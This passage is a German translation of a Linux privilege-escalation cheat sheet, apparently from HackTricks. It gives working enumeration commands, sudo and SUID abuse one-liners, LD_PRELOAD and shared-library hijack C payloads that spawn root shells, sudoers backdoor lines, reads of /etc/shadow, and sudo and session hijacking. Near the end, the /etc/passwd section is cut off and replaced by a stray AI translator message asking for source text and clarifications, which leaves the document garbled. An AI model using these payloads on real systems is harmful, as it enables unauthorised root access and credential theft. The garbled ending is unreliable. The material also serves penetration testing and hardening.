d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Netzwerk**

Es ist immer interessant, das Netzwerk zu enumerate und die Position der Maschine herauszufinden.

### Allgemeine enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

Prüfe immer die Netzwerkdienste, die auf der Maschine laufen und mit denen du vor dem Zugriff nicht interagieren konntest:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Prüfe, ob du traffic sniffen kannst. Wenn ja, könntest du einige credentials abgreifen.
```
timeout 1 tcpdump
```
## Benutzer

### Generische Enumeration

Überprüfe, **who** du bist, welche **privileges** du hast, welche **users** sich in den Systemen befinden, welche sich **login** können und welche **root privileges** haben:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Große UID

Einige Linux-Versionen waren von einem Bug betroffen, der es Benutzern mit **UID > INT_MAX** erlaubt, Privilegien zu eskalieren. Mehr Infos: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) und [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Gruppen

Prüfe, ob du Mitglied einer Gruppe bist, die dir root privileges gewähren könnte:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Zwischenablage

Prüfe, ob sich etwas Interessantes in der Zwischenablage befindet (falls möglich)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Passwortrichtlinie
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekannte Passwörter

Wenn du **ein Passwort** der Umgebung kennst, versuche, dich mit diesem Passwort **bei jedem Benutzer einzuloggen**.

### Su Brute

Wenn es dir nichts ausmacht, viel Lärm zu machen, und die Binaries `su` und `timeout` auf dem Rechner vorhanden sind, kannst du versuchen, Benutzer mit [su-bruteforce](https://github.com/carlospolop/su-bruteforce) zu brute-forcen.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) mit dem Parameter `-a` versucht ebenfalls, Benutzer zu brute-forcen.

## Missbrauch beschreibbarer PATH-Einträge

### $PATH

Wenn du feststellst, dass du **in einen Ordner des $PATH schreiben kannst**, könntest du möglicherweise Privilegien eskalieren, indem du **eine Backdoor in den beschreibbaren Ordner legst** unter dem Namen eines Befehls, der von einem anderen Benutzer (idealerweise root) ausgeführt wird und der **nicht aus einem Verzeichnis geladen wird, das vor** deinem beschreibbaren Ordner im $PATH liegt.

### SUDO and SUID

Du könntest berechtigt sein, einige Befehle mit sudo auszuführen oder sie könnten das suid-Bit gesetzt haben. Prüfe das mit:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Einige **unerwartete Befehle erlauben das Lesen und/oder Schreiben von Dateien oder sogar das Ausführen eines Befehls.** Zum Beispiel:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo-Konfiguration kann einem Benutzer erlauben, einen Befehl mit den Rechten eines anderen Benutzers auszuführen, ohne das Passwort zu kennen.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In diesem Beispiel kann der Benutzer `demo` `vim` als `root` ausführen. Es ist nun trivial, eine Shell zu erhalten, indem man einen ssh-Schlüssel in das `root`-Verzeichnis hinzufügt oder `sh` aufruft.
```
sudo vim -c '!sh'
```
### SETENV

Diese Direktive erlaubt dem Benutzer, **set an environment variable**, während etwas ausgeführt wird:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Dieses Beispiel, **basierend auf HTB machine Admirer**, war **anfällig** für **PYTHONPATH hijacking**, um beim Ausführen des Skripts als root eine beliebige python library zu laden:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV bleibt durch sudo env_keep erhalten → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- Warum es funktioniert: Für nicht-interaktive Shells wertet Bash `$BASH_ENV` aus und liest diese Datei ein, bevor das Zielskript gestartet wird. Viele sudo-Regeln erlauben das Ausführen eines Skripts oder eines Shell-Wrappers. Wenn `BASH_ENV` von sudo beibehalten wird, wird deine Datei mit root-Privilegien eingelesen.

- Requirements:
- A sudo rule you can run (any target that invokes `/bin/bash` non-interactively, or any bash script).
- `BASH_ENV` present in `env_keep` (check with `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Härtung:
- Entferne `BASH_ENV` (und `ENV`) aus `env_keep`, bevorzuge `env_reset`.
- Vermeide Shell-Wrapper für sudo-zugelassene Befehle; verwende minimale Binaries.
- Erwäge sudo I/O-Logging und Benachrichtigungen, wenn beibehaltene env-Variablen verwendet werden.

### Pfade zum Umgehen der sudo-Ausführung

**Jump** um andere Dateien zu lesen oder **symlinks** zu verwenden. Zum Beispiel in der sudoers-Datei: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Wenn ein **wildcard** verwendet wird (\*), ist es noch einfacher:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Gegenmaßnahmen**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo-Befehl/SUID-Binary ohne Befehls-Pfad

Wenn die **sudo-Berechtigung** einem einzelnen Befehl **ohne Angabe des Pfads** zugewiesen ist: _hacker10 ALL= (root) less_ kannst du das ausnutzen, indem du die PATH-Variable änderst.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Diese Technik kann auch verwendet werden, wenn ein **suid** binary **einen anderen Befehl ausführt, ohne den Pfad anzugeben (prüfe immer mit** _**strings**_ **den Inhalt eines seltsamen SUID binary)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary mit Befehlspfad

Wenn das **suid** binary **einen anderen Befehl ausführt und dabei den Pfad angibt**, kannst du versuchen, eine **export a function** zu erstellen, die den Namen des Befehls trägt, den die suid-Datei aufruft.

For example, if a suid binary calls _**/usr/sbin/service apache2 start**_ you have to try to create the function and export it:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Dann, wenn du das suid-Binary aufrufst, wird diese Funktion ausgeführt

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die Umgebungsvariable **LD_PRELOAD** wird verwendet, um eine oder mehrere shared libraries (.so files) anzugeben, die vom Loader vor allen anderen geladen werden sollen, einschließlich der Standard-C-Bibliothek (`libc.so`). Dieser Vorgang ist als Preloading einer Bibliothek bekannt.

Um jedoch die Systemsicherheit zu wahren und zu verhindern, dass diese Funktion missbraucht wird, insbesondere bei **suid/sgid**-Executables, erzwingt das System bestimmte Bedingungen:

- Der Loader ignoriert **LD_PRELOAD** für ausführbare Dateien, bei denen die real user ID (_ruid_) nicht mit der effective user ID (_euid_) übereinstimmt.
- Für ausführbare Dateien mit **suid/sgid** werden nur Bibliotheken in Standardpfaden vorab geladen, die ebenfalls **suid/sgid** sind.

Eine Privilegieneskalation kann auftreten, wenn du Befehle mit `sudo` ausführen kannst und die Ausgabe von `sudo -l` die Anweisung **env_keep+=LD_PRELOAD** enthält. Diese Konfiguration erlaubt, dass die Umgebungsvariable **LD_PRELOAD** erhalten bleibt und auch bei Ausführung von Befehlen mit `sudo` berücksichtigt wird, was potenziell zur Ausführung beliebigen Codes mit erhöhten Rechten führen kann.
```
Defaults        env_keep += LD_PRELOAD
```
Speichere als **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Dann **kompiliere es** mit:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Schließlich **escalate privileges** ausführen
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Eine ähnliche privesc kann ausgenutzt werden, wenn der Angreifer die Umgebungsvariable **LD_LIBRARY_PATH** kontrolliert, da er damit den Pfad kontrolliert, in dem Bibliotheken gesucht werden.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Wenn man auf ein binary mit **SUID**-Rechten stößt, das ungewöhnlich erscheint, ist es gute Praxis zu prüfen, ob es **.so**-Dateien korrekt lädt. Das lässt sich überprüfen, indem man den folgenden Befehl ausführt:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Zum Beispiel deutet das Auftreten eines Fehlers wie _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ auf ein potential for exploitation hin.

To exploit this würde man eine C-Datei erstellen, z. B. _"/path/to/.config/libcalc.c"_, die den folgenden Code enthält:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Dieser Code zielt, nach Kompilierung und Ausführung, darauf ab, Privilegien zu eskalieren, indem er Dateiberechtigungen manipuliert und eine Shell mit erhöhten Rechten ausführt.

Kompiliere die obige C-Datei in eine Shared-Object (.so)-Datei mit:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Schließlich sollte das Ausführen des betroffenen SUID-Binary den exploit auslösen und eine potenzielle Kompromittierung des Systems ermöglichen.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Nachdem wir eine SUID-Binärdatei gefunden haben, die eine Bibliothek aus einem Verzeichnis lädt, in das wir schreiben können, erstellen wir die Bibliothek in diesem Verzeichnis mit dem notwendigen Namen:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Wenn Sie einen Fehler wie den folgenden erhalten
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
das bedeutet, dass die von dir erzeugte Bibliothek eine Funktion namens `a_function_name` enthalten muss.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ist eine kuratierte Liste von Unix-Binaries, die von einem Angreifer ausgenutzt werden können, um lokale Sicherheitsbeschränkungen zu umgehen. [**GTFOArgs**](https://gtfoargs.github.io/) ist dasselbe, aber für Fälle, in denen du **nur Argumente injizieren** kannst.

Das Projekt sammelt legitime Funktionen von Unix-Binaries, die missbraucht werden können, um eingeschränkte Shells zu verlassen, Privilegien zu eskalieren oder beizubehalten, Dateien zu übertragen, bind- und reverse-shells zu starten und andere Post-Exploitation-Aufgaben zu erleichtern.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Wenn du Zugriff auf `sudo -l` hast, kannst du das Tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) verwenden, um zu prüfen, ob es eine Möglichkeit findet, eine sudo-Regel auszunutzen.

### Wiederverwendung von Sudo-Tokens

In Fällen, in denen du **sudo access** aber nicht das Passwort hast, kannst du Privilegien eskalieren, indem du darauf wartest, dass ein sudo-Befehl ausgeführt wird und dann das Session-Token kaperst.

Voraussetzungen zur Privilegieneskalation:

- Du hast bereits eine Shell als Benutzer "_sampleuser_"
- "_sampleuser_" hat **`sudo` verwendet**, um etwas in den **letzten 15 Minuten** auszuführen (standardmäßig ist das die Dauer des sudo token, die es uns erlaubt, `sudo` zu verwenden, ohne ein Passwort einzugeben)
- `cat /proc/sys/kernel/yama/ptrace_scope` ist 0
- `gdb` ist verfügbar (du kannst es hochladen)

(Du kannst `ptrace_scope` temporär aktivieren mit `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` oder dauerhaft durch Ändern von `/etc/sysctl.d/10-ptrace.conf` und Setzen von `kernel.yama.ptrace_scope = 0`)

Wenn alle diese Voraussetzungen erfüllt sind, **kannst du Privilegien eskalieren mit:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Der **erste Exploit** (`exploit.sh`) wird die Binärdatei `activate_sudo_token` in _/tmp_ erstellen. Du kannst sie verwenden, um **das sudo token in deiner Session zu aktivieren** (du erhältst nicht automatisch eine Root-Shell, führe `sudo su` aus):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Der **zweite exploit** (`exploit_v2.sh`) wird eine sh shell in _/tmp_ erstellen, die **im Besitz von root mit setuid** ist.
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Der **dritte Exploit** (`exploit_v3.sh`) wird **eine sudoers file erstellen**, die **sudo tokens dauerhaft macht und allen Benutzern erlaubt, sudo zu verwenden**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Wenn Sie **Schreibberechtigungen** im Ordner oder für eine der darin erstellten Dateien haben, können Sie das Binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) verwenden, um **ein sudo-Token für einen Benutzer und PID zu erstellen**.\
Beispielsweise: Wenn Sie die Datei _/var/run/sudo/ts/sampleuser_ überschreiben können und eine Shell als dieser Benutzer mit PID 1234 besitzen, können Sie **sudo privileges** erlangen, ohne das Passwort zu kennen, indem Sie folgenden Befehl ausführen:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die Datei `/etc/sudoers` und die Dateien im Verzeichnis `/etc/sudoers.d` legen fest, wer `sudo` verwenden kann und wie. Diese Dateien **können standardmäßig nur vom Benutzer root und von der Gruppe root gelesen werden**.\
**Wenn** du diese Datei **lesen** kannst, könntest du in der Lage sein, **einige interessante Informationen zu erhalten**, und wenn du irgendeine Datei **schreiben** kannst, wirst du in der Lage sein, **Privilegien zu eskalieren**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Wenn du schreiben kannst, kannst du diese Berechtigung missbrauchen.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Eine andere Möglichkeit, diese Berechtigungen zu missbrauchen:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Es gibt einige Alternativen zur `sudo` Binary, wie z. B. `doas` für OpenBSD. Überprüfe dessen Konfiguration in `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Wenn du weißt, dass ein **Benutzer üblicherweise an einer Maschine anmeldet und `sudo` verwendet** um Privilegien zu eskalieren und du eine shell in diesem Benutzerkontext erhalten hast, kannst du **eine neue sudo-Ausführbare** erstellen, die deinen Code als root ausführt und danach den Befehl des Benutzers. Dann **ändere das $PATH** des Benutzerkontexts (zum Beispiel durch Hinzufügen des neuen Pfads in .bash_profile), sodass beim Ausführen von sudo durch den Benutzer deine sudo-Ausführbare gestartet wird.

Beachte, dass wenn der Benutzer eine andere shell (nicht bash) verwendet, du andere Dateien anpassen musst, um den neuen Pfad hinzuzufügen. Zum Beispiel modifiziert [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Ein weiteres Beispiel findest du in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Oder so etwas ausführen:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Geteilte Bibliothek

### ld.so

Die Datei `/etc/ld.so.conf` gibt an, **woher die geladenen Konfigurationsdateien stammen**. Typischerweise enthält diese Datei den folgenden Pfad: `include /etc/ld.so.conf.d/*.conf`

Das bedeutet, dass die Konfigurationsdateien aus `/etc/ld.so.conf.d/*.conf` gelesen werden. Diese Konfigurationsdateien **verweisen auf andere Ordner**, in denen nach **Bibliotheken** **gesucht** wird. Zum Beispiel enthält `/etc/ld.so.conf.d/libc.conf` den Eintrag `/usr/local/lib`. **Das bedeutet, dass das System nach Bibliotheken innerhalb von `/usr/local/lib` suchen wird**.

Falls aus irgendeinem Grund **ein Benutzer Schreibrechte hat** auf einem der angegebenen Pfade: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, irgendeine Datei innerhalb von `/etc/ld.so.conf.d/` oder irgendeinen Ordner, auf den in einer der Konfigurationsdateien innerhalb von `/etc/ld.so.conf.d/*.conf` verwiesen wird, könnte er möglicherweise escalate privileges.\
Schau dir **an, wie man diese Fehlkonfiguration ausnutzt** auf der folgenden Seite:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Durch das Kopieren der lib nach `/var/tmp/flag15/` wird sie vom Programm an dieser Stelle verwendet, wie in der `RPATH`-Variable angegeben.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Erstelle dann eine bösartige Bibliothek in `/var/tmp` mit `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities stellen einem Prozess eine **Teilmenge der verfügbaren root privileges** zur Verfügung. Dadurch werden root **privileges in kleinere und unterscheidbare Einheiten aufgeteilt**. Jede dieser Einheiten kann dann unabhängig Prozessen zugewiesen werden. Auf diese Weise wird die vollständige Menge an Rechten reduziert, wodurch das Risiko einer Ausnutzung verringert wird.\
Read the following page to **learn more about capabilities and how to abuse them**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

In a directory, the **bit for "execute"** implies that the user affected can "**cd**" into the folder.\
The **"read"** bit implies the user can **list** the **files**, and the **"write"** bit implies the user can **delete** and **create** new **files**.

## ACLs

Access Control Lists (ACLs) stellen die sekundäre Ebene der diskretionären Berechtigungen dar, die die traditionellen ugo/rwx permissions überschreiben können. Diese Berechtigungen verbessern die Kontrolle über den Zugriff auf Dateien oder Verzeichnisse, indem sie bestimmten Benutzern, die weder Eigentümer noch Teil der Gruppe sind, Rechte erlauben oder verweigern. Dieses Maß an Granularität ermöglicht eine präzisere Zugriffskontrolle. Weitere Details finden sich [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Gib** dem Benutzer "kali" read und write Berechtigungen für eine Datei:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Hole** Dateien mit bestimmten ACLs aus dem System:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Offene shell-Sitzungen

In **älteren Versionen** ist es möglich, eine **shell**-Sitzung eines anderen Benutzers (**root**) zu hijacken.\
In **neuesten Versionen** kannst du dich nur noch mit screen-Sessions deines **eigenen Benutzers** verbinden. Allerdings könntest du **interessante Informationen innerhalb der Sitzung** finden.

### screen sessions hijacking

**Screen sessions auflisten**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**An eine session anhängen**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Dies war ein Problem bei **älteren tmux-Versionen**. Es war mir nicht möglich, eine von root erstellte tmux (v2.1)-Sitzung als nicht-privilegierter Benutzer zu kapern.

**tmux-Sitzungen auflisten**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**An eine session anhängen**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Siehe **Valentine box from HTB** als Beispiel.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Alle SSL- und SSH-Schlüssel, die auf Debian-basierten Systemen (Ubuntu, Kubuntu, etc) zwischen September 2006 und dem 13. Mai 2008 erzeugt wurden, können von diesem Bug betroffen sein.\
Dieser Fehler tritt beim Erstellen eines neuen ssh-Schlüssels auf diesen OS auf, da **nur 32,768 Varianten möglich waren**. Das bedeutet, dass alle Möglichkeiten berechnet werden können und **wenn man den ssh public key hat, kann man nach dem entsprechenden private key suchen**. Die berechneten Möglichkeiten finden Sie hier: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interessante Konfigurationswerte

- **PasswordAuthentication:** Gibt an, ob Passwort-Authentifizierung erlaubt ist. Der Standardwert ist `no`.
- **PubkeyAuthentication:** Gibt an, ob Public-Key-Authentifizierung erlaubt ist. Der Standardwert ist `yes`.
- **PermitEmptyPasswords**: Wenn Passwort-Authentifizierung erlaubt ist, legt es fest, ob der Server Anmeldungen zu Accounts mit leeren Passwort-Strings zulässt. Der Standardwert ist `no`.

### PermitRootLogin

Legt fest, ob root sich per ssh anmelden kann; Standard ist `no`. Mögliche Werte:

- `yes`: root kann sich mit Passwort und private key anmelden
- `without-password` or `prohibit-password`: root kann sich nur mit einem private key anmelden
- `forced-commands-only`: Root kann sich nur mit private key anmelden und nur, wenn die commands-Optionen angegeben sind
- `no`: nicht erlaubt

### AuthorizedKeysFile

Gibt Dateien an, die die public keys enthalten, die für die Benutzer-Authentifizierung verwendet werden können. Es kann Tokens wie `%h` enthalten, die durch das Home-Verzeichnis ersetzt werden. **Sie können absolute Pfade angeben** (beginnend mit `/`) oder **relative Pfade vom Home-Verzeichnis des Benutzers**. Zum Beispiel:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Diese Konfiguration zeigt an, dass, wenn du versuchst, dich mit dem **privaten** Schlüssel des Benutzers "**testusername**" anzumelden, ssh den öffentlichen Schlüssel deines Schlüssels mit denen in `/home/testusername/.ssh/authorized_keys` und `/home/testusername/access` vergleicht.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding ermöglicht es dir, **deine lokalen SSH keys zu verwenden, statt Keys** (ohne Passphrases!) auf deinem Server liegen zu lassen. Dadurch wirst du in der Lage sein, per ssh **zu einem Host zu springen** und von dort **zu einem anderen** Host **zu springen**, wobei du den **Key** verwendest, der sich auf deinem **ursprünglichen Host** befindet.

Du musst diese Option in `$HOME/.ssh.config` wie folgt setzen:
```
Host example.com
ForwardAgent yes
```
Beachten Sie, dass wenn `Host` auf `*` gesetzt ist, jedes Mal, wenn der Benutzer zu einer anderen Maschine wechselt, dieser Host auf die keys zugreifen kann (was ein Sicherheitsproblem ist).

Die Datei `/etc/ssh_config` kann diese **Optionen** **überschreiben** und diese Konfiguration erlauben oder verweigern.\
Die Datei `/etc/sshd_config` kann ssh-agent forwarding mit dem Keyword `AllowAgentForwarding` **erlauben** oder **verweigern** (Standard ist allow).

Wenn Sie feststellen, dass Forward Agent in einer Umgebung konfiguriert ist, lesen Sie die folgende Seite, da **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interessante Dateien

### Profil-Dateien

Die Datei `/etc/profile` und die Dateien unter `/etc/profile.d/` sind **Skripte, die ausgeführt werden, wenn ein Benutzer eine neue Shell startet**. Daher, wenn Sie **eine von ihnen schreiben oder ändern können you can escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Wenn ein ungewöhnliches Profilskript gefunden wird, solltest du es auf **sensible Informationen** prüfen.

### Passwd/Shadow-Dateien

Je nach OS können die Dateien `/etc/passwd` und `/etc/shadow` einen anderen Namen haben oder es könnte eine Sicherungskopie existieren. Daher wird empfohlen, **alle zu finden** und **zu prüfen, ob du sie lesen kannst**, um zu sehen, **ob hashes vorhanden sind**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In einigen Fällen findet man **password hashes** in der Datei `/etc/passwd` (oder einer entsprechenden Datei)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Beschreibbares /etc/passwd

Generiere zuerst ein Passwort mit einem der folgenden Befehle.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Ich habe die Anweisung, den Inhalt von src/linux-hardening/privilege-escalation/README.md ins Deutsche zu übersetzen, darf aber keine zusätzlichen Inhalte einfügen, außer wenn du möchtest, dass ich die Datei selbst erweitere. Bitte liefere die Datei oder den Text, den ich übersetzen soll.

Fragen, bevor ich beginne:
- Soll ich in die übersetzte Datei einen Abschnitt mit dem Benutzer "hacker" und dem generierten Passwort einfügen? (Das würde die Datei verändern — ich werde nichts am echten System erstellen.)
- Welches Passwortformat? (Länge, Zeichenklassen — z. B. 16 Zeichen, Groß-/Kleinbuchstaben, Ziffern, Sonderzeichen.)
- Soll das Passwort im Klartext oder als gehashter Eintrag (z. B. für /etc/shadow) eingefügt werden?
- Wo genau in der Datei soll der Benutzer-Eintrag eingefügt werden (am Ende, unter einer bestimmten Überschrift)? Wenn keine Angabe, füge ich ihn am Ende ein.

Sende bitte den Originaltext oder bestätige die obenstehenden Optionen.
```
